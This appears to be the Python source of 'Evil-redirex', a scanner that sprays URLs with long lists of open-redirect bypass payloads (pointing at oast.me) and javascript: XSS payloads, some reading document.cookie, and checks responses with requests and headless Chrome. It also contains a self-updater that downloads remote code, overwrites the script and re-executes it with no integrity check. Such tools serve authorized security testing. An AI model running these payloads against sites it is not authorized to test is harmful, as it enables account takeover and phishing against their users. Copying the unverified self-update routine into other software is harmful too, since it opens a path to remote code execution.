import os
import requests
import re
import time
import threading
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options  # For managing Chrome options
from selenium.webdriver.chrome.service import Service
from termcolor import colored, cprint
from urllib3.exceptions import InsecureRequestWarning, LocationParseError
import urllib3
import argparse
from packaging.version import Version

# Constants for update check
UPDATE_URL = "https://raw.githubusercontent.com/Evil-twinz/Evil-redirex/refs/heads/main/evilredirex.py"  # Update with your actual URL
CURRENT_VERSION = "1.0"  # Increment this for each new release


# Disable SSL warnings
urllib3.disable_warnings(InsecureRequestWarning)

# Define payloads, regex, and test params
payloads = [
    r'%0a/oast.me/', r'%0d/oast.me/', r'%00/oast.me/', r'%09/oast.me/', r'%5C%5Coast.me/%252e%252e%252f', r'%5Coast.me',
    r'%5coast.me/%2f%2e%2e', r'%5c{{RootURL}}oast.me/%2f%2e%2e', r'../oast.me', r'.oast.me', r'/%5coast.me',
    r'////\;@oast.me', r'////oast.me', r'///oast.me', r'///oast.me/%2f%2e%2e', r'///oast.me@//',
    r'///{{RootURL}}oast.me/%2f%2e%2e', r'//;@oast.me', r'//\/oast.me/', r'//\@oast.me', r'//\oast.me',
    r'//oast.me\toast.me/', r'//https://oast.me//', r'/<>//oast.me', r'/\/\/oast.me/', r'/\/oast.me', r'/\oast.me',
    r'/oast.me', r'/oast.me/%2F..', r'/oast.me/', r'/oast.me/..;/css', r'/https:oast.me', r'/{{RootURL}}oast.me/',
    r'/ÃƒÂ£Ã¢â€šÂ¬Ã‚Â±oast.me', r'/ÃƒÂ£Ã¢â€šÂ¬Ã‚Âµoast.me', r'/ÃƒÂ£Ã¢â‚¬Å¡Ã‚Âoast.me', r'/ÃƒÂ£Ã†â€™Ã‚Â¼oast.me', r'/ÃƒÂ¯Ã‚Â½Ã‚Â°oast.me', r'<>//oast.me', r'@oast.me',
    r'@https://oast.me', r'\/\/oast.me/', r'oast%E3%80%82me', r'oast.me', r'oast.me/', r'oast.me//', r'oast.me;',
    r'https%3a%2f%2foast.me%2f', r'https:%0a%0doast.me', r'https://%0a%0doast.me', r'https://%09/oast.me',
    r'https://%2f%2f.oast.me/', r'https://%3F.oast.me/', r'https://%5c%5c.oast.me/', r'https://%5coast.me@',
    r'https://%23.oast.me/', r'https://.oast.me', r'https://////oast.me', r'https:///oast.me',
    r'https:///oast.me/%2e%2e',
    r'https:///oast.me/%2f%2e%2e', r'https:///oast.me@oast.me/%2e%2e', r'https:///oast.me@oast.me/%2f%2e%2e',
    r'https://:80#@oast.me/', r'https://:80?@oast.me/', r'https://:@\@oast.me', r'https://:@oast.me\@oast.me',
    r'https://;@oast.me', r'https://\toast.me/', r'https://oast.me/oast.me', r'https://oast.me/https://oast.me/',
    r'https://www.\.oast.me', r'https:/\/\oast.me', r'https:/\oast.me', r'https:/oast.me', r'https:oast.me',
    r'{{RootURL}}oast.me', r'ÃƒÂ£Ã¢â€šÂ¬Ã‚Â±oast.me', r'ÃƒÂ£Ã¢â€šÂ¬Ã‚Âµoast.me', r'ÃƒÂ£Ã¢â‚¬Å¡Ã‚Âoast.me', r'ÃƒÂ£Ã†â€™Ã‚Â¼oast.me', r'ÃƒÂ¯Ã‚Â½Ã‚Â°oast.me', r'redirect/oast.me',
    r'cgi-bin/redirect.cgi?oast.me', r'out?oast.me', r'login?to=http://oast.me', r'1/_https@oast.me',
    r'redirect?targeturl=https://oast.me',r'https://oast.me/', r'/https://oast.me/', r'//https://oast.me//', r'?targetOrigin=https://oast.me/', r'?fallback=https://oast.me/', r'?query=https://oast.me/', r'?redirection_url=https://oast.me/', r'?next=https://oast.me/', r'?ref_url=https://oast.me/', r'?state=https://oast.me/', r'?1=https://oast.me/', r'?redirect_uri=https://oast.me/', r'?forum_reg=https://oast.me/', r'?return_to=https://oast.me/', r'?redirect_url=https://oast.me/', r'?return_url=https://oast.me/', r'?host=https://oast.me/', r'?url=https://oast.me/', r'?redirectto=https://oast.me/', r'?return=https://oast.me/', r'?prejoin_data=https://oast.me/', r'?callback_url=https://oast.me/', r'?path=https://oast.me/', r'?authorize_callback=https://oast.me/', r'?email=https://oast.me/', r'?origin=https://oast.me/', r'?continue=https://oast.me/', r'?domain_name=https://oast.me/', r'?redir=https://oast.me/', r'?wp_http_referer=https://oast.me/', r'?endpoint=https://oast.me/', r'?shop=https://oast.me/', r'?qpt_question_url=https://oast.me/', r'?checkout_url=https://oast.me/', r'?ref_url=https://oast.me/', r'?redirect_to=https://oast.me/', r'?succUrl=https://oast.me/', r'?file=https://oast.me/', r'?link=https://oast.me/', r'?referrer=https://oast.me/', r'?recipient=https://oast.me/', r'?redirect=https://oast.me/', r'?u=https://oast.me/', r'?hostname=https://oast.me/', r'?returnTo=https://oast.me/', r'?return_path=https://oast.me/', r'?image=https://oast.me/', r'?requestTokenAndRedirect=https://oast.me/', r'?retURL=https://oast.me/', r'?next_url=https://oast.me/', r'/redirect.php?url=https://oast.me/', r'/r/?url=https://oast.me/', r'/login?next=https://oast.me/', r'/checkcookie?redir=https://oast.me/', r'/#/path///https://oast.me/', r'/login?to=https://oast.me/', r'?view=https://oast.me/', r'/out?https://oast.me/', r'/cgi-bin/redirect.cgi?https://oast.me/', r'/redirect/https://oast.me/', r'/redirect?url=https://oast.me/', r'/link?url=https://oast.me/', r'?target=https://oast.me/', r'?rurl=https://oast.me/', r'?dest=https://oast.me/', r'?destination=https://oast.me/', r'?image_url=https://oast.me/', r'?go=https://oast.me/', r'?returnTo=https://oast.me/', r'/success=https://oast.me/', r'/data=https://oast.me/', r'/qurl=https://oast.me/', r'/login=https://oast.me/', r'/logout=https://oast.me/', r'/ext=https://oast.me/', r'/clickurl=https://oast.me/', r'/goto=https://oast.me/'
]
redirect_regex = r'^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)oast\.me\/?(\/|[^.].*)?$'
params_to_test = [
    'AuthState', 'URL', '_url', 'callback', 'checkout', 'checkout_url', 'content', 'continue', 'continueTo', 'counturl',
    'data', 'dest', 'dest_url', 'destination', 'dir', 'document', 'domain', 'done', 'download', 'feed', 'file',
    'file_name',
    'file_url', 'folder', 'folder_url', 'forward', 'from_url', 'go', 'goto', 'host', 'html', 'http', 'https', 'image',
    'image_src', 'image_url', 'imageurl', 'img', 'img_url', 'include', 'langTo', 'load_file', 'load_url', 'login_to',
    'login_url', 'logout', 'media', 'navigation', 'next', 'next_page', 'open', 'out', 'page', 'page_url', 'pageurl',
    'path',
    'picture', 'port', 'proxy', 'r', 'r2', 'redir', 'redirect', 'redirectUri', 'redirectUrl', 'redirect_to',
    'redirect_uri',
    'redirect_url', 'reference', 'referrer', 'req', 'request', 'ret', 'retUrl', 'return', 'returnTo', 'return_path',
    'return_to', 'return_url', 'rt', 'rurl', 'show', 'site', 'source', 'src', 'target', 'to', 'u', 'uri', 'url', 'val',
    'validate', 'view', 'window', 'back', 'cgi', 'follow', 'home', 'jump', 'link', 'location', 'menu', 'move', 'nav',
    'orig_url', 'out_url', 'query', 'auth', 'callback_url', 'confirm_url', 'destination_url', 'domain_url', 'entry',
    'exit',
    'forward_url', 'go_to', 'goto_url', 'home_url', 'image_link', 'load', 'logout_url', 'nav_to', 'origin', 'page_link',
    'redirect_link', 'ref', 'referrer_url', 'return_link', 'return_to_url', 'source_url', 'target_url', 'to_url',
    'validate_url', 'DirectTo', 'relay', 'redirecturl', 'service'
]
xss_payloads = [
    "javascript:alert(1)",
    "java%0d%0ascript%0d%0a:alert(0)",
    "javascript://%250Aalert(1)",
    "javascript://%250Aalert(1)//?1",
    "javascript://%250A1?alert(1):0",
    "%09Jav%09ascript:alert(document.domain)",
    "javascript://%250Alert(document.location=document.cookie)",
    "/%09/javascript:alert(1);",
    "/%09/javascript:alert(1)",
    "//%5cjavascript:alert(1);",
    "//%5cjavascript:alert(1)",
    "/%5cjavascript:alert(1);",
    "/%5cjavascript:alert(1)",
    "javascript://%0aalert(1)",
    "<>javascript:alert(1);",
    "//javascript:alert(1);",
    "/javascript:alert(1);",
    "\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)",
    "javascript:alert(1);",
    "javascript:alert(1)",
    "javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)",
    "javascript:confirm(1)",
    "javascript://https://whitelisted.com/?z=%0Aalert(1)",
    "javascript:prompt(1)",
    "jaVAscript://whitelisted.com//%0d%0aalert(1);//",
    "javascript://whitelisted.com?%a0alert%281%29",
    "/x:1/:///%01javascript:alert(document.cookie)/"
]


def is_valid_url(url):
    """
    Validates if the provided string is a valid URL.
    """
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except Exception:
        return False


# Open Redirect Checker
def check_open_redirect(url):
    parsed_url = urlparse(url)
    queries = parse_qs(parsed_url.query)
    try:
        for param in queries:
            if param in params_to_test or param.lower() in params_to_test:
                new_queries = queries.copy()
                new_queries[param] = ['https://evil-twinz.github.io/evil']
                new_query_string = urlencode(new_queries, doseq=True)
                new_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params,
                                      new_query_string, parsed_url.fragment))

                try:
                    response = requests.get(new_url, allow_redirects=False, verify=False, timeout=5)
                    location = response.headers.get('Location', '')
                    if response.status_code in [301, 302, 307] and re.match(redirect_regex, location):
                        print(colored(f"[!] Open Redirect Detected: {new_url}", "red"))
                        return True
                except requests.RequestException as e:
                    print(colored(f'Error requesting {new_url}: {e}', 'red'))
        return False
    except KeyboardInterrupt:
        print(colored("[!] Test interrupted by user. Exiting gracefully...", "red"))
        return False


# Test for open redirect via Location header
def test_redirect_location(url):
    try:
        for payload in payloads:
            target_url = f"{url}/{payload}"
            if not is_valid_url(target_url):
                print(colored(f"[!] Invalid URL skipped: {target_url}", "yellow"))
                continue

            try:
                response = requests.get(target_url, allow_redirects=False, timeout=5)

                if response.status_code in [301, 302, 307, 308]:
                    location = response.headers.get('Location', '')
                    if re.match(redirect_regex, location):
                        print(colored(f"[!] Open Redirect Detected: {target_url}", "red"))
                        print(colored(f"    -> Redirects to: {location}", "cyan"))
                        return True
                else:
                    pass
            except requests.ConnectionError:
                continue  # Retry the same payload
            except requests.RequestException as e:
                print(colored(f"[!] Error testing {target_url}: {e}", "yellow"))
            except LocationParseError as e:
                print(colored(f"[!] URL parsing error for {target_url}: {e}", "yellow"))

        return False
    except KeyboardInterrupt:
        print(colored("[!] Test interrupted by user. Exiting gracefully...", "red"))
        return False


# XSS Vulnerability Checker
def check_xss_vulnerability(url):
    parsed_url = urlparse(url)
    queries = parse_qs(parsed_url.query)
    try:
        for param in queries:
            if param in params_to_test or param.lower() in params_to_test:
                for payload in xss_payloads:
                    new_queries = queries.copy()
                    new_queries[param] = [payload]
                    new_query_string = urlencode(new_queries, doseq=True)
                    new_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params,
                                          new_query_string, parsed_url.fragment))

                    try:
                        response = requests.get(new_url, allow_redirects=False, verify=False, timeout=5)
                        if payload in response.content.decode('utf-8', errors='ignore'):
                            print(colored(f"[!] XSS Detected: {new_url}", "red"))
                            return True
                    except requests.RequestException as e:
                        print(colored(f'Error requesting {new_url}: {e}', 'red'))
        return False
    except KeyboardInterrupt:
        print(colored("[!] Test interrupted by user. Exiting gracefully...", "red"))
        return False


# Selenium Alert Handler
def dismiss_alert(driver):
    try:
        alert = driver.switch_to.alert
        alert.dismiss()
    except Exception:
        pass


# Page Source Test using Selenium
def test_page_source(url):
    options = Options()
    options.add_argument('--headless=new')
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    retry_attempts = 3  # Retry WebDriver connection attempts
    driver = None

    for attempt in range(retry_attempts):
        try:
            chrome_service = Service()
            driver = webdriver.Chrome(service=chrome_service, options=options)
            break  # If successful, exit loop
        except Exception as e:
            print(colored(f"[!] WebDriver init failed (attempt {attempt + 1}/{retry_attempts}): {e}", "yellow"))
            if attempt == retry_attempts - 1:
                return False
            time.sleep(3)  # Wait before retry

    try:
        for payload in payloads:
            target_url = f"{url}/{payload}"
            if not is_valid_url(target_url):
                print(colored(f"[!] Invalid URL skipped: {target_url}", "yellow"))
                continue

            try:
                driver.get(target_url)
                time.sleep(2)
                dismiss_alert(driver)

                if "Interactsh Server" in driver.page_source:
                    print(colored(f"[!] Vulnerability detected by page source: {target_url}", "red"))
                    return True
            except Exception as e:
                print(colored(f"[!] Error testing {target_url}: {str(e)}", "yellow"))
    except KeyboardInterrupt:
        pass
    finally:
        driver.quit()


def process_urls(urls):
    """
    Processes each URL one by one from a list or stdin.
    """
    for url in urls:
        url = url.strip()  # Clean the URL
        if not url or not is_valid_url(url):
            print(colored(f"[!] Invalid URL: {url}", "red"))
            continue

        print(colored(f"Testing URL: {url}", "blue"))

        # Threading for each function
        open_redirect_thread = threading.Thread(target=check_open_redirect, args=(url,))
        redirect_location_thread = threading.Thread(target=test_redirect_location, args=(url,))
        xss_thread = threading.Thread(target=check_xss_vulnerability, args=(url,))
        page_source_thread = threading.Thread(target=test_page_source, args=(url,))

        # Start threads
        open_redirect_thread.start()
        redirect_location_thread.start()
        xss_thread.start()
        page_source_thread.start()

        # Wait for all threads to complete
        try:
            open_redirect_thread.join(timeout=5)
            redirect_location_thread.join(timeout=5)
            xss_thread.join(timeout=5)
            page_source_thread.join(timeout=5)
        except KeyboardInterrupt:
            print(colored("[!] Testing interrupted by user. Exiting gracefully...", "red"))
            return


# Check for updates

def clean_version(version):
    """Clean the version string to remove unwanted characters like quotes or extra spaces."""
    return version.strip().replace('"', '').replace("'", "")


def check_for_updates():
    """
    Checks for updates to the script by comparing the current version with the remote version.
    If a newer version is found, downloads and replaces the script, then restarts it.
    """
    try:
        print("[+] Checking for updates...")

        # Fetch the remote script
        response = requests.get(UPDATE_URL, timeout=10)
        response.raise_for_status()
        remote_code = response.text

        # Extract the remote version
        remote_version_line = next((line for line in remote_code.splitlines() if "CURRENT_VERSION" in line), None)
        if not remote_version_line:
            print("[!] Version information not found in the remote script.")
            return

        # Extract the version number using regex
        match = re.search(r'CURRENT_VERSION\s*=\s*["\']([\d\.]+)["\']', remote_version_line)
        if not match:
            print("[!] Could not parse the version from the remote script.")
            return

        remote_version = match.group(1)

        # Compare versions
        if Version(remote_version) > Version(CURRENT_VERSION):
            print(f"[+] New version available: {remote_version}. Updating now...")

            # Save the updated script to the same file
            script_path = os.path.abspath(__file__)
            with open(script_path, 'w', encoding='utf-8') as current_file:
                current_file.write(remote_code)

            print("[+] Update complete. Restarting...")

            # Add an argument to signal that the update is complete
            os.execv(sys.executable, [sys.executable, script_path, "--updated"])
        elif "--updated" in sys.argv:
            print("[+] Update verification complete. Running the updated script.")
        else:
            print("[+] You are using the latest version.")

    except requests.RequestException as e:
        print(f"[!] Failed to check for updates: {e}")
    except Exception as e:
        print(f"[!] Unexpected error during update: {e}")




def main():
    if "--update-complete" in sys.argv:
        print("[+] Update already completed. Running the updated script.")

    check_for_updates()

    # Argument parser setup
    parser = argparse.ArgumentParser(description="Test for open redirects and XSS vulnerabilities.")
    parser.add_argument('-u', '--url', type=str, help="Single URL to test")
    parser.add_argument('--silent', action='store_true', help="Run in silent mode.")
    args = parser.parse_args()

    # Print banner only if --silent is not specified
    if not args.silent:
        cprint(r"""
         ____ __ __ __ __    ____   ____ ____   __ ____   ____ _   _
        ||    || || || ||    || \\ ||    || \\  || || \\ ||    \\ //
        ||==  \\ // || ||    ||_// ||==  ||  )) || ||_// ||==   )X( 
        ||___  \V/  || ||__| || \\ ||___ ||_//  || || \\ ||___ // \\
        """, "cyan")
        cprint(r"""                                  @ Srilakivarma Evil-Twinz | v1.0                                         
        """, "green", attrs=["blink"])

    # Get URL from argument or stdin
    if args.url:
        urls = [args.url.strip()]
    else:
        # Read URLs from stdin (this is for piped input)
        urls = sys.stdin.read().splitlines()

    # Process URLs one by one
    process_urls(urls)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("[!] Program terminated by user.", "red"))
